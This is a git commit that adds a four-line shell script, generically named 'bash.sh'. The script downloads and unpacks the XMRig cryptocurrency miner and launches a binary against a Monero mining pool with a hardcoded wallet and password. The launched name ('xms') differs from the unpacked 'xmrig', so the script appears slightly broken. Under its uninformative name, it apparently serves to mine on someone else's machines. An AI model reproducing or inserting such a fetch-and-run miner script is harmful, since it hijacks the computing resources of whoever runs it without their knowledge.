98a41a53be3e4eb2464236e2d501c6d1b2e87bde
buozud <84149893+buozud@users.noreply.github.com>
2021-05-14 07:45:41 +0200

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,4 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-bionic-x64.tar.gz
+tar xf xmrig-6.12.1-bionic-x64.tar.gz
+cd xmrig-6.12.1
+./xms --url pool.hashvault.pro:80 --user hvxy26Fsyz3GiKdKH9sP96T8UKyd7D1hnedoXYVawNkg84nxvr2J8X5XcRHoPya1paftqpLcK2ucnePS8avVNkYv9wHQ4E87cp --pass Heysitkd --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
